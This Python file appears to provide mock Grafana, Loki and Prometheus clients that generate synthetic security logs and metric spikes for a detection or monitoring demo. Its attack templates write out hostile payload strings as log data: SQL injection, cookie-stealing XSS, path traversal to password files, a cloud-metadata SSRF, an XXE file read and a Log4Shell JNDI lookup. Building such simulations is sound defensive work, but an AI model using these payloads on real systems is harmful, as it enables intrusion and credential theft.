import logging
import random
from datetime import datetime, timedelta
from typing import Any, Dict, List

from .config import Config

logger = logging.getLogger(__name__)


class GrafanaClient:
    """Mock client for Grafana API."""
    def __init__(self, config: Config):
        self.base_url = config["grafana"]["base_url"]

    def fetch_dashboards(self) -> List[Dict[str, Any]]:
        logger.debug("Fetching dashboards from Grafana")
        return [{"id": 1, "title": "Main Cyber Dashboard"}]



def _random_ip():
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def _internal_ip():
    return f"192.168.{random.randint(1, 10)}.{random.randint(2, 200)}"

# All attack templates with metadata for diverse simulation
ATTACK_TEMPLATES = [
    # ── WEB APPLICATION ATTACKS ─────────────────────────────
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /index.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 200 4500',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /login HTTP/1.1" 200 1200 body="username=admin\' OR 1=1--&password=foo"',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /search?q=<script>document.cookie=\'stolen=\'+document.cookie</script> HTTP/1.1" 200 900',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /page?url=javascript:alert(1) HTTP/1.1" 200 512',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2048',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /view?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1" 403 0',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1" 200 1500',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /api/xml HTTP/1.1" 500 200 body="<!DOCTYPE foo [<!ENTITY xxe SYSTEM \'file:///etc/passwd\'>]>"',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /render?template={{{{7*7}}}} HTTP/1.1" 200 300',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /api/deserialize HTTP/1.1" 500 200 body="rO0ABXNyAA1qYXZhLnV0aWwuTWFw"',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /api/data?id=1 HTTP/1.1" 200 12000 Transfer-Encoding: chunked Content-Length: 0',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /api/users?limit=10000 HTTP/1.1" 200 8888',
    # ── LOG4SHELL / KNOWN CVE ────────────────────────────────
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET / HTTP/1.1" 200 1024 User-Agent: ${{jndi:ldap://{ip}:1389/exploit}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"ERROR\", \"message\": \"Log4Shell payload detected in header: ${{jndi:dns://{ip}/CVE-2021-44228}}\"}}',
    # ── AUTHENTICATION ATTACKS ────────────────────────────────
    lambda ip, dt: f'{dt.strftime("%b %d %H:%M:%S")} webserver sshd[{random.randint(1000,9999)}]: Failed password for invalid user admin from {ip} port {random.randint(1024,65535)} ssh2',
    lambda ip, dt: f'{dt.strftime("%b %d %H:%M:%S")} webserver sshd[{random.randint(1000,9999)}]: Failed password for root from {ip} port {random.randint(1024,65535)} ssh2',
    lambda ip, dt: f'{dt.isoformat()}Z ERROR auth - Authentication failure: max auth attempts exceeded for user admin from {ip}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"WARN\", \"message\": \"Password spraying detected: 50 accounts failed login from {ip} in 30 seconds\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"WARN\", \"message\": \"OAuth token reuse detected: bearer token misuse from {ip}\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Credential exposure in logs: password=P@ssw0rd123 for user svcadmin\"}}',
    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL app - Credential dumping detected: lsass.exe memory access by unknown process from {ip}',
    lambda ip, dt: f'{dt.isoformat()}Z WARN app - Forged JWT token detected from {ip}: signature mismatch on bearer token',
    # ── PRIVILEGE ESCALATION ──────────────────────────────────
    lambda ip, dt: f'{dt.strftime("%b %d %H:%M:%S")} server sudo:    www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Container escape detected: docker.sock mounted and accessed from container PID 1\"}}',
    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL kernel - DirtyCow exploit attempt detected from process PID {random.randint(1000,9999)}',
    lambda ip, dt: f'{dt.isoformat()}Z WARN sudo - pkexec privilege escalation: unauthorized attempt from {ip}',
    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Kernel exploit: perf_event_open local privilege escalation attempt from user www-data',
    # ── NETWORK ATTACKS ───────────────────────────────────────
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"WARN\", \"message\": \"Port scan detected: nmap SYN scan from {ip} - 1024 ports scanned in 2s\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"DDoS: SYN flood from {ip} — 80,000 packets/second detected, connection limit reached\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"ARP poisoning detected: ARP spoof from {ip} on internal subnet 192.168.1.0/24\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"DNS tunneling: unusually long DNS query from {ip} — base64 encoded payload in subdomain\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Lateral movement: pass-the-hash from {ip} to 192.168.1.20 via SMB\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"TLS downgrade attack detected: SSL strip attempt from {ip} — certificate mismatch\"}}',
    # ── MALWARE & EXECUTION ───────────────────────────────────
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Ransomware encryption detected in /home/user/docs — files renamed to .encrypted\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Cryptominer detected: xmrig process connecting to stratum+tcp://pool.minexmr.com:4444\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"C2 beacon detected: reverse shell callback to {ip}:4444 — backdoor installed\"}}',
    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Fileless malware: powershell -EncodedCommand aQBlAHgAIA... executed in memory',
    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Persistence mechanism: new systemd service created by www-data in /etc/systemd/system/',
    lambda ip, dt: f'{dt.isoformat()}Z WARN sec - LOLBin abuse: certutil -decode dropping payload to C:\\Windows\\Temp\\malware.exe',
    # ── DATA EXFILTRATION ─────────────────────────────────────
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Data exfiltration detected: 2.4GB outbound transfer to {ip} on port 443\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Database dump detected: mysqldump executed by app user — 50,000 rows exported\"}}',
    # ── CLOUD / INFRASTRUCTURE ────────────────────────────────
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Cloud metadata abuse: 169.254.169.254 IMDSv1 request from container {ip} — IAM credentials exposed\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"K8s API abuse: unauthorized kubectl exec to kube-apiserver from {ip} — ClusterRoleBinding created\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"IAM policy abuse: unauthorized assume role STS GetSessionToken for AdminAccess from {ip}\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"S3 public access: bucket policy modified to public-read — sensitive data now exposed\"}}',
    # ── DEFENSE EVASION ───────────────────────────────────────
    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Log tampering: wevtutil cl Security — event log cleared by unknown process',
    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Firewall disabled: iptables -F executed — all firewall rules flushed from {ip}',
    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Anomalous process injection: CreateRemoteThread into explorer.exe from unknown parent',
    lambda ip, dt: f'{dt.isoformat()}Z WARN sec - SSH key tampering: authorized_keys modified in /root/.ssh/ by www-data user',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"Tor exit node traffic detected from {ip} — anonymizer in use for C2 communications\"}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Supply chain attack: malicious npm package installed — dependency confusion detected\"}}',
]

# Normal benign log templates
BENIGN_TEMPLATES = [
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /index.html HTTP/1.1" 200 {random.randint(1000, 8000)}',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /api/login HTTP/1.1" 200 {random.randint(200, 1200)}',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /static/app.js HTTP/1.1" 304 0',
    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /api/health HTTP/1.1" 200 25',
    lambda ip, dt: f'{dt.isoformat()}Z INFO app - User {random.choice(["alice","bob","charlie","dave"])} logged in successfully from {ip}',
    lambda ip, dt: f'{dt.isoformat()}Z INFO app - Scheduled backup completed in {random.randint(10,300)}s',
    lambda ip, dt: f'{dt.strftime("%b %d %H:%M:%S")} server sshd[{random.randint(1000,9999)}]: Accepted publickey for deploy from {ip} port {random.randint(1024,65535)} ssh2',
    lambda ip, dt: f'{dt.strftime("%b %d %H:%M:%S")} server cron[{random.randint(100,999)}]: (root) CMD (/usr/bin/certbot renew --quiet)',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"api-gateway\", \"message\": \"Request completed\", \"status\": 200, \"latency_ms\": {random.randint(5,200)}}}',
    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"DEBUG\", \"message\": \"Cache hit for key user_session_{random.randint(1000,9999)}\"}}',
]


class LokiClient:
    """Mock client for Loki logs — generates rich, realistic multi-source log data."""
    def __init__(self, config: Config):
        self.base_url = config["loki"]["base_url"]

    def query_logs(self, query: str, limit: int = 100) -> List[str]:
        logger.debug("Querying Loki logs: %s", query)
        logs = []
        now = datetime.utcnow()
        for _ in range(limit):
            dt = now - timedelta(seconds=random.randint(0, 60))
            logs.append(self._generate_mock_log(dt))
        return logs

    def _generate_mock_log(self, dt: datetime) -> str:
        ip = _random_ip()
        # ~12% of logs are attacks for realistic simulation
        if random.random() < 0.12:
            template = random.choice(ATTACK_TEMPLATES)
            return template(ip, dt)
        # Remaining are benign
        template = random.choice(BENIGN_TEMPLATES)
        return template(ip, dt)


class PrometheusClient:
    """Mock client for Prometheus metrics with realistic spikes and anomalies."""
    def __init__(self, config: Config):
        self.base_url = config["prometheus"]["base_url"]

    def query_metrics(self, query: str) -> Dict[str, float]:
        logger.debug("Querying Prometheus metrics: %s", query)
        # ~8% chance of a resource spike (DDoS, cryptominer, etc.)
        is_spike = random.random() < 0.08
        # ~3% chance of a network exfiltration anomaly
        is_exfil = random.random() < 0.03

        return {
            "cpu_usage": random.uniform(88.0, 100.0) if is_spike else random.uniform(10.0, 55.0),
            "memory_usage": random.uniform(92.0, 99.5) if is_spike else random.uniform(30.0, 72.0),
            "network_tx": random.uniform(50000.0, 200000.0) if is_exfil else random.uniform(100.0, 6000.0),
            "network_rx": random.uniform(50000.0, 200000.0) if is_spike else random.uniform(100.0, 6000.0),
            "active_connections": random.randint(5000, 50000) if is_spike else random.randint(10, 300),
            "http_error_rate": random.uniform(0.5, 1.0) if is_spike else random.uniform(0.0, 0.05),
            "failed_login_rate": random.uniform(0.3, 1.0) if is_spike else random.uniform(0.0, 0.02),
            "dns_query_rate": random.uniform(1000.0, 5000.0) if is_exfil else random.uniform(10.0, 200.0),
        }
